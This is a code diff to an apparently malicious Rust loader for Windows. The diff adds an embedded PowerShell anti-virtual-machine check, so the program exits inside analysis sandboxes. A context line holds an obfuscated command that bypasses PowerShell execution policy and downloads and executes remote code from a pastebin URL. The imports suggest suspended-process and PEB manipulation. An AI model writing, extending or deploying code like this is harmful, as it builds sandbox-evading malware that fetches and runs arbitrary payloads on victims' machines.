@@ -10,6 +10,7 @@ use windows_sys::Win32::System::Threading::{
     CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW, PEB, PROCESS_BASIC_INFORMATION,
     PROCESS_INFORMATION_CLASS, CREATE_NEW_CONSOLE, CREATE_SUSPENDED,
 };
+use std::process::Command;
 use windows_sys::Win32::Foundation::{UNICODE_STRING, NTSTATUS};
 use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 
@@ -27,6 +28,17 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
 }
 
 fn main() {
+    const ANTI_VM_SCRIPT: &str = include_str!("../anti-vm.ps1");
+
+    let output = Command::new("powershell")
+        .args(&["-Command", ANTI_VM_SCRIPT])
+        .output()
+        .expect("Failed to execute PowerShell script");
+
+    if !String::from_utf8_lossy(&output.stdout).contains("No virtual machine has been detected.") {
+        return;
+    }
+
     let malicious_command = obf_str!("powershell.exe -ExecutionPolicy Bypass -Command \"IEX (Invoke-WebRequest -Uri 'https://pastebin.pl/view/raw/0ae25fc9' -UseBasicParsing).Content\"");
     let malicious_command_wide = to_wide_chars(&malicious_command);
 
